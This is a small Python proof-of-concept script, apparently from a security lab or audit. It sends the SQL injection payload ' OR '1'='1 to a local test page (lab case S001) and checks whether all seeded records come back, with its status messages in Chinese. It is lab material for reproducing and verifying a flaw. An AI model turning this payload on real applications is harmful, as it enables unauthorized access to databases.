#!/usr/bin/env python3
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"


def fetch(name: str) -> str:
    query = urllib.parse.urlencode({"name": name})
    url = f"{BASE}?{query}"
    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8", "replace")
    print(f"URL: {url}")
    print(body[:500].replace("\n", " "))
    return body


def main() -> int:
    normal = fetch("Alice")
    payload = fetch("' OR '1'='1")

    normal_ok = (
        "ID 1" in normal
        and "Alice" in normal
        and "ID 2" not in normal
        and "ID 3" not in normal
    )
    inject_ok = (
        "ID 1" in payload
        and "ID 2" in payload
        and "ID 3" in payload
    )

    print("普通对照通过:", normal_ok)
    print("注入对照通过:", inject_ok)

    if normal_ok and inject_ok:
        print("OBSERVED: 普通输入仅返回 Alice；测试输入返回全部预置记录，SQL 注入可复现。")
        return 0

    print("未观察到预期差异。请检查：服务/URL、db_connect.php、MariaDB、lab_people 预置数据、error_log；不要仅凭 HTTP 200 判断成功。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
